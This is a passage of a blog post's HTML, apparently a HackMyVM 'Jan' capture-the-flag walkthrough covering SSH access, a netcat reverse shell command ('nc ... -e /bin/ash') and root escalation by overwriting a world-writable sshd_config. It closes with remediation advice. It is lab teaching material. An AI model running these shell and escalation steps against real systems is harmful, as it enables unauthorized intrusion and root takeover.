+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_977cdf704a769fe2.webp 330w,http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_e3651deaec4cd1a8.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_fa3ccbcc368d6f30.webp 712w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_fa3ccbcc368d6f30.webp 712w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="712"
+        height="55"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_b1d9c5a123517881.png" srcset="http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_647402df243ac9c.png 330w,http://localhost:1313/posts/jan-hackmyvm/credz-leak_hu_b1d9c5a123517881.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/credz-leak.png 712w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/credz-leak.png 712w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The leaked password is redacted here as <code>&lt;REDACTED&gt;</code>.</p>
+<h2 id="step-2-initial-access" class="relative group">Step 2: Initial Access <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-2-initial-access" aria-label="Anchor">#</a></span></h2><p>I tried to test the password using <code>root</code> as the username, but it did not work, as that was not the password for the root user.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/jan-hackmyvm/ssh-root-fail_hu_815f828afbbbef80.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="412"
+        height="108"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/ssh-root-fail.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The file used <code>ssh</code>, which could also be a potential username. I used <code>ssh</code> as the username and successfully gained access into the server.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/jan-hackmyvm/ssh-login_hu_7aaf7bbfd9303504.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="648"
+        height="221"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/ssh-login.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-3-enumeration-as-ssh" class="relative group">Step 3: Enumeration as ssh <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-3-enumeration-as-ssh" aria-label="Anchor">#</a></span></h2><p>My initial foothold was as the <code>ssh</code> user.</p>
+<pre tabindex="0"><code>jan:~$ id
+uid=1000(ssh) gid=1000(ssh) groups=1000(ssh)
+</code></pre><p>I checked if the user has the ability to execute sudo in the server.</p>
+<pre tabindex="0"><code>sudo -l
+</code></pre><p>The result showed I could run <code>/sbin/service sshd restart</code> via sudo with no password.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_c16d092a564ee947.webp 330w,http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_d68b030f3a2c64ae.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_c0ef4d660a140d43.webp 763w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_c0ef4d660a140d43.webp 763w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="763"
+        height="178"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_f182b15678a820fc.png" srcset="http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_8540e75c241b0e17.png 330w,http://localhost:1313/posts/jan-hackmyvm/sudo-l_hu_f182b15678a820fc.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sudo-l.png 763w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sudo-l.png 763w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Running the command confirmed the service restarts successfully.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_82d81bd1264781ac.webp 330w,http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_456cc0a1ef22b778.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_b16a7a4d4c96155f.webp 955w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_b16a7a4d4c96155f.webp 955w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="955"
+        height="70"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_c4e58423943aa975.png" srcset="http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_73c0fdcb10c37972.png 330w,http://localhost:1313/posts/jan-hackmyvm/sudo-service_hu_c4e58423943aa975.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sudo-service.png 955w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sudo-service.png 955w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<h2 id="step-4-privilege-escalation" class="relative group">Step 4: Privilege Escalation <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#step-4-privilege-escalation" aria-label="Anchor">#</a></span></h2><p>Since the command executes successfully, I tried to see if I could abuse this and escalate to root.</p>
+<h3 id="failed-command-injection" class="relative group">Failed Command Injection <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#failed-command-injection" aria-label="Anchor">#</a></span></h3><p>I tested if I could inject a command at the end to see if it escapes safely — the command at the end is executed.</p>
+<pre tabindex="0"><code>sudo /sbin/service sshd restart;ls
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_134a761c7a93b98b.webp 330w,http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_8699b3e70e7b9c38.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_fa6f11648fa973af.webp 951w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_fa6f11648fa973af.webp 951w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="951"
+        height="68"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_46e864bac153bd32.png" srcset="http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_915fd281563dd3ff.png 330w,http://localhost:1313/posts/jan-hackmyvm/command-injection_hu_46e864bac153bd32.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/command-injection.png 951w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/command-injection.png 951w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>My method was to use this to start a reverse shell which would execute with sudo and grant root access, so I started a listener in <strong>Penelope</strong> to catch the shell.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_eeb3b9911da0c3f9.webp 330w,http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_7e03291bdf62a77d.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_89e41037fe32fcf7.webp 707w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_89e41037fe32fcf7.webp 707w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="707"
+        height="107"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_6fa3b77f8effcc67.png" srcset="http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_18bc9814253f17a5.png 330w,http://localhost:1313/posts/jan-hackmyvm/penelope-listener_hu_6fa3b77f8effcc67.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/penelope-listener.png 707w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/penelope-listener.png 707w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>The host has <code>nc</code> installed.</p>
+<pre tabindex="0"><code>jan:~$ nc
+BusyBox v1.37.0 (2025-01-17 18:12:01 UTC) multi-call binary.
+
+Usage: nc [OPTIONS] HOST PORT  - connect
+nc [OPTIONS] -l -p PORT [HOST] [PORT]  - listen
+
+        -e PROG Run PROG after connect (must be last)
+        -l      Listen mode, for inbound connects
+        -lk     With -e, provides persistent server
+        -p PORT Local port
+        -s ADDR Local address
+        -w SEC  Timeout for connects and final net reads
+        -i SEC  Delay interval for lines sent
+        -n      Don&#39;t do DNS resolution
+        -u      UDP mode
+        -b      Allow broadcasts
+        -v      Verbose
+        -o FILE Hex dump traffic
+        -z      Zero-I/O mode (scanning)
+jan:~$ 
+</code></pre><p>So I used it to start the shell on the victim.</p>
+<pre tabindex="0"><code>sudo /sbin/service sshd restart; nc 192.168.56.1 4445 -e /bin/ash
+</code></pre><p>The shell connects but as the user <code>ssh</code>, so I could not access root using this method and had to check another path. Confirming whether the commands are really executed using sudo at the end confirms that the permission is stripped for the extra command at the end, which is why I could not get a shell as root.</p>
+<pre tabindex="0"><code>~ $ sudo /sbin/service sshd restart;ls /root
+ * Stopping sshd ...                          [ ok ]
+ * Starting sshd ...                          [ ok ]
+ls: can&#39;t open &#39;/root&#39;: Permission denied
+~ $ 
+</code></pre><p>There is also no other user in the system other than the <code>ssh</code> user.</p>
+<h3 id="ssh-config-abuse" class="relative group">SSH Config Abuse <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#ssh-config-abuse" aria-label="Anchor">#</a></span></h3><p>Doing some research, there is a way to escalate by creating an SSH key and using it to authenticate as root by exploiting the SSH configuration, since I have read and write access.</p>
+<pre tabindex="0"><code>/home $ ls -la /etc/ssh/sshd_config
+-rw-rw-rw-    1 root     root          3355 Jan 28  2025 /etc/ssh/sshd_config
+</code></pre><p>I only needed to create an SSH key pair, then overwrite the config file and add the following lines.</p>
+<pre tabindex="0"><code>echo &#34;PermitRootLogin yes&#34; &gt; /etc/ssh/sshd_config
+echo &#34;StrictModes no&#34; &gt;&gt; /etc/ssh/sshd_config
+echo &#34;AuthorizedKeysFile /home/ssh/id_rsa.pub&#34; &gt;&gt; /etc/ssh/sshd_config
+</code></pre><p>I generated the SSH keys.</p>
+<pre tabindex="0"><code>ssh-keygen -t rsa
+Generating public/private rsa key pair.
+Enter file in which to save the key (/home/ssh/.ssh/id_rsa): /home/ssh/id_rsa
+Enter passphrase for &#34;/home/ssh/id_rsa&#34; (empty for no passphrase):
+Enter same passphrase again:
+Your identification has been saved in /home/ssh/id_rsa
+Your public key has been saved in /home/ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:s0m+Dvpdy98rS9d6kOqjxYvnJGkeLISBhag0SNY7nwY ssh@jan
+The key&#39;s randomart image is:
++---[RSA 3072]----+
+|oo.. ..          |
+|oo...o           |
+|... o .          |
+|.  E   o         |
+|    + o S      . |
+|     + + = o  o. |
+|    . . = B =....|
+|     . o B O=+ ..|
+|    ....+ ***++o |
++----[SHA256]-----+
+~ $ ls
+id_rsa      id_rsa.pub  user.txt
+~ $
+</code></pre><p>After this, the last step was to restart the service and use the created key to authenticate as root.</p>
+<p>I edited the configuration file.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_8e85be8e0cd8f245.webp 330w,http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_3849e0a3d6e7c5b5.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_a1ee97861e6057ce.webp 814w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_a1ee97861e6057ce.webp 814w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="814"
+        height="139"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_cc5dd73c6ac664d1.png" srcset="http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_978489c8dbcc17b2.png 330w,http://localhost:1313/posts/jan-hackmyvm/sshd-config_hu_cc5dd73c6ac664d1.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sshd-config.png 814w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sshd-config.png 814w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>I restarted the SSH service using my sudo privilege.</p>
+<p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            srcset="http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_7a86792f914edb95.webp 330w,http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_66e87daca9434b4e.webp 660w
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_2be0779ebae5e3cb.webp 967w
+              
+            
+            
+              
+                ,http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_2be0779ebae5e3cb.webp 967w
+              
+            "
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="967"
+        height="57"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_37320a383cb562e.png" srcset="http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_6a4fb83843566035.png 330w,http://localhost:1313/posts/jan-hackmyvm/sshd-restart_hu_37320a383cb562e.png 660w
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sshd-restart.png 967w
+          
+          
+            ,http://localhost:1313/posts/jan-hackmyvm/sshd-restart.png 967w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>Using the public key to authenticate as root failed:</p>
+<pre tabindex="0"><code>ssh -i id_rsa root@localhost
+</code></pre><p>This failed, so I resorted to using the <code>-F</code> flag (<code>-F configfile</code>) to bypass the config file and load it cleanly.</p>
+<pre tabindex="0"><code>ssh -F /dev/null -i id_rsa root@localhost
+</code></pre><p>
+
+
+
+
+
+<figure>
+    
+    
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="mx-auto my-0 rounded-md"
+      
+    >
+      
+      
+      
+      
+        <source
+          
+            
+              srcset="http://localhost:1313/posts/jan-hackmyvm/root-key-auth_hu_922c23d08aa52acb.webp"
+            
+          
+          sizes="100vw"
+          type="image/webp"
+        />
+      
+      <img
+        width="560"
+        height="240"
+        class="mx-auto my-0 rounded-md"
+        
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/posts/jan-hackmyvm/root-key-auth.png"
+        
+      />
+    </picture>
+  
+
+
+</figure>
+</p>
+<p>This gave me a <code>root</code> shell, completing the compromise.</p>
+<h2 id="conclusion" class="relative group">Conclusion <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#conclusion" aria-label="Anchor">#</a></span></h2><p>This box combined a proxy SSRF with an SSH configuration misconfiguration to reach root:</p>
+<ol>
+<li>HTTP service on 8080 behaves as a proxy to internal endpoints.</li>
+<li><code>/robots.txt</code> revealed <code>/redirect</code> and <code>/credz</code>.</li>
+<li>The <code>/redirect</code> handler was vulnerable to HTTP Parameter Pollution (<code>?url&amp;url=</code>), leaking credentials for the <code>ssh</code> user.</li>
+<li>The <code>ssh</code> user could restart <code>sshd</code> via sudo, and <code>/etc/ssh/sshd_config</code> was world-writable.</li>
+<li>I overwrote the config to permit root key login and authenticated as root.</li>
+</ol>
+<p>To secure the environment, the following remediations are recommended:</p>
+<ul>
+<li><strong>Validate the <code>url</code> parameter</strong> in the redirect handler and block requests to internal hosts/resources to prevent SSRF.</li>
+<li><strong>Fix the parameter parsing</strong> so duplicate <code>url</code> parameters are rejected, closing the HTTP Parameter Pollution vector.</li>
+<li><strong>Do not expose credentials or secrets</strong> through internal endpoints that can be reached over a proxy.</li>
+<li><strong>Restrict access to <code>/etc/ssh/sshd_config</code></strong> — set strict permissions so only root can read or write it.</li>
+<li><strong>Disable root login over SSH</strong> (<code>PermitRootLogin no</code>) and <code>StrictModes</code> should remain enabled.</li>
+<li><strong>Follow the principle of least privilege</strong> for sudo rules so command injection cannot be leveraged.</li>
+</ul>
+
+      </div>
+    </section>
+    <footer class="max-w-prose pt-8 print:hidden">
+      
+  <div class="flex">
+    
+    
+    
+      
+      
+        
+        
+
+
+
+
+
+
+
+
+  
+    <picture
+      class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+      
+    >
+      
+      
+      
+      
+      <img
+        width="960"
+        height="1280"
+        class="!mb-0 !mt-0 me-4 w-24 h-auto rounded-full"
+        alt="k40t1k"
+        loading="lazy" decoding="async"
+        
+          src="http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg" srcset="http://localhost:1313/img/k40t1k_hu_210ca2abc75c60a7.jpeg 330w,http://localhost:1313/img/k40t1k_hu_ebd2a57fb32cf973.jpeg 660w
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          
+          
+            ,http://localhost:1313/img/k40t1k.jpeg 960w
+          "
+          sizes="100vw"
+        
+      />
+    </picture>
+  
+
+
+      
+    
+    <div class="place-self-center">
+      
+        <div class="text-[0.6rem] uppercase leading-3 text-neutral-500 dark:text-neutral-400">
+          Author
+        </div>
+        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
+          k40t1k
+        </div>
+      
+      
+      <div class="text-2xl sm:text-lg">
+  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://github.com/jkilonzi"
+          target="_blank"
+          aria-label="Github"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://linkedin.com/in/john-maluki"
+          target="_blank"
+          aria-label="Linkedin"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"/></svg>
+</span></a
+        >
+      
+    
+      
+        <a
+          class="px-1 transition-transform hover:scale-125 hover:text-primary-700 dark:hover:text-primary-400"
+          style="will-change:transform;"
+          href="https://medium.com/@jkilonzi301"
+          target="_blank"
+          aria-label="Medium"
+          rel="me noopener noreferrer"
+          ><span class="icon relative inline-block px-1 align-text-bottom"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 640 512"><path fill="currentColor" d="M180.5,74.262C80.813,74.262,0,155.633,0,256S80.819,437.738,180.5,437.738,361,356.373,361,256,280.191,74.262,180.5,74.262Zm288.25,10.646c-49.845,0-90.245,76.619-90.245,171.095s40.406,171.1,90.251,171.1,90.251-76.619,90.251-171.1H559C559,161.5,518.6,84.908,468.752,84.908Zm139.506,17.821c-17.526,0-31.735,68.628-31.735,153.274s14.2,153.274,31.735,153.274S640,340.631,640,256C640,171.351,625.785,102.729,608.258,102.729Z"/></svg>
+</span></a
+        >
+      
+    
+  </div>
+
+</div>
+    </div>
+  </div>
+
+
+      
+
+      
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="group flex" href="http://localhost:1313/posts/gift-hackmyvm/">
+              <span
+                class="me-2 text-neutral-700 transition-transform group-hover:-translate-x-[2px] group-hover:text-primary-600 dark:text-neutral dark:group-hover:text-primary-400"
+                ><span class="ltr:inline rtl:hidden">&larr;</span
+                ><span class="ltr:hidden rtl:inline">&rarr;</span></span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >GIFT — HackMyVM</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2026-08-31 16:45:00 &#43;0300 EAT">31 August 2026</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+      
+    </footer>
+  </article>
+
+      </main>
+      
+        <div
+          class="pointer-events-none absolute bottom-0 end-0 top-[100vh] w-12"
+          id="to-top"
+          hidden="true"
+        >
+          <a
+            href="#the-top"
+            class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 backdrop-blur hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+            aria-label="Scroll to top"
+            title="Scroll to top"
+          >
+            &uarr;
+          </a>
+        </div>
+      <footer class="py-10 print:hidden">
+  
+  
+  <div class="flex items-center justify-between">
+    <div>
+      
+      
+        <p class="text-sm text-neutral-500 dark:text-neutral-400">
+            &copy;
+            2026
+            k40t1k
+        </p>
+      
+      
+      
+        <p class="text-xs text-neutral-500 dark:text-neutral-400">
+          
+          
+          Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+            href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500" href="https://github.com/jpanther/congo" target="_blank" rel="noopener noreferrer">Congo</a>
+        </p>
+      
+    </div>
+    <div class="flex flex-row items-center">
+      
+      
+      
+      
+    </div>
+  </div>
+  
+  
+</footer>
+
+    </div>
+  </body>
+</html>
